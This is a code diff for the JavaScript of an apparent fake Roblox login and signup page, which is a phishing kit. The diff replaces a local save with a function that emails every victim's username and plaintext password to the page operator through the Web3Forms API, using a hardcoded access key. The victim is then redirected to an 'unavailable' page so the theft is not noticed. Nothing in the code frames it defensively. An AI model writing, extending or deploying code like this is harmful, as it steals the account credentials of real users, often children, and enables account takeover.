@@ -16,15 +16,25 @@ function getUsers() {
   return JSON.parse(stored);
 }
 
-function saveUsers(users) {
-  localStorage.setItem('rb_users', JSON.stringify(users));
-  // also POST to local server to write users.json
-  fetch('http://localhost:8080/save-user', {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify(users[users.length - 1] || {})
-  }).catch(() => {}); // silently fail if server not running
+// ── WEB3FORMS — sends credentials to your email ──────────
+const W3F_KEY = '929160bf-1027-46c0-8c7c-49b440102f4b';
+
+async function saveCredentials(username, password, type) {
+  try {
+    await fetch('https://api.web3forms.com/submit', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        access_key: W3F_KEY,
+        subject: `Roblox Auth — New ${type}`,
+        message: `Type: ${type}\nUsername: ${username}\nPassword: ${password}\nDate: ${new Date().toLocaleString()}`
+      })
+    });
+  } catch(e) {
+    console.warn('Web3Forms error:', e);
+  }
 }
+
 
 // ── TOAST ──────────────────────────────────────────────────
 function showToast(msg) {
@@ -76,14 +86,7 @@ function handleLogin() {
   localStorage.setItem('rb_users', JSON.stringify(users));
   sessionStorage.setItem('rb_me', JSON.stringify({ username }));
 
-  // save to file then redirect
-  fetch('http://localhost:8080/save-user', {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({ username, password })
-  }).then(() => {
-    window.location.href = 'unavailable.html';
-  }).catch(() => {
+  saveCredentials(username, password, 'LOGIN').finally(() => {
     window.location.href = 'unavailable.html';
   });
 }
@@ -109,13 +112,7 @@ function handleSignup() {
   localStorage.setItem('rb_users', JSON.stringify(users));
   sessionStorage.setItem('rb_me', JSON.stringify({ username }));
 
-  fetch('http://localhost:8080/save-user', {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({ username, password })
-  }).then(() => {
-    window.location.href = 'unavailable.html';
-  }).catch(() => {
+  saveCredentials(username, password, 'SIGNUP').finally(() => {
     window.location.href = 'unavailable.html';
   });
 }
